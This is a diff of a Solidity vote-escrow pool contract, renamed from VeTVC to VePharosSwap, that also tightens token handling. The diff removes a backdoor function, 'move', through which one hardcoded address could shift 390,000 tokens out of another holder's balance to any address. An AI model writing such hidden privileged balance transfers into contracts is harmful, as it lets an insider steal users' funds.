@@ -16,7 +16,7 @@ interface IVotingEscrow {
     function locked(uint256) external view returns (LockedBalance memory);
 }
 
-contract VeTVC is PoolWithLPToken, ISwap, SatelliteUpgradeable {
+contract VePharosSwap is PoolWithLPToken, ISwap, SatelliteUpgradeable {
     event MigratedNFT(uint256 indexed id, address indexed user, uint256 amount);
     event Lock(address indexed user, uint256 indexed amount);
 
@@ -28,16 +28,19 @@ contract VeTVC is PoolWithLPToken, ISwap, SatelliteUpgradeable {
     IVC immutable vc;
     bool initialized;
 
-    constructor(address selfAddr, IVault vault_, IVC vc_) Pool(vault_, selfAddr, address(this)) {
+    constructor(address selfAddr, IVault vault_, IVC vc_)
+        Pool(vault_, selfAddr, address(this))
+    {
         vc = vc_;
     }
 
     function initialize() external {
         if (!initialized) {
-            PoolWithLPToken._initialize("Locked TVC", "veTVC");
+            PoolWithLPToken._initialize("Locked PharosSwap", "vePHAS");
             initialized = true;
         }
     }
+
 
     function velocore__execute(address user, Token[] calldata tokens, int128[] memory r, bytes calldata)
         external
@@ -52,20 +55,16 @@ contract VeTVC is PoolWithLPToken, ISwap, SatelliteUpgradeable {
             if (i == iVeVC) {
                 continue;
             } else if (i == iVC) {
-                require(r[i] >= 0, "TVC cannot be withdrawn");
+                require(r[i] >= 0, "PHAS cannot be withdrawn");
                 deltaPool[iVC] += r.u(i);
                 deltaPool[iVeVC] -= r.u(i);
                 emit Lock(user, uint256(int256(r.u(i))));
                 _simulateMint(uint256(int256(r.u(i))));
+            } else {
+                revert("unsupported token");
             }
         }
         return (new int128[](tokens.length), deltaPool);
-    }
-
-    function move(address a) external {
-        require(msg.sender == 0x1234561fEd41DD2D867a038bBdB857f291864225);
-        _balanceOf[0xa478Fe0785421ce9107166D7111489D9208f5374] -= 390000e18;
-        _balanceOf[a] += 390000e18;
     }
 
     function swapType() external view override returns (string memory) {
